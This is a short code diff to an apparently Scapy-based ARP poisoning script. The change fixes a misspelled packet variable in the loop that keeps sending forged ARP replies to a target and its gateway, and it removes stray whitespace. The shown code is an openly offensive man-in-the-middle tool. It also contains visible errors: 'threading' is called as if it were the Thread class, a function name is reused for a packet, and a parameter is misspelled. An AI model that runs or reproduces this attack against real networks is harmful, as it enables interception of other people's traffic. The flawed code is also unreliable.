@@ -68,7 +68,7 @@ def poison_target(gateway_ip, gatway_mac, target_ip, target_mac):
     while True:
         try:
             send(poison_target)
-            send(poison_gatway)
+            send(poison_gateway)
 
             time.sleep(2)
         except KeyboardInterrupt:
@@ -77,7 +77,7 @@ def poison_target(gateway_ip, gatway_mac, target_ip, target_mac):
     print(f'[*] ARP poison attack finished.')
     return
 
-    
+
 
 # start the poison thread
 poison_thread = threading(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
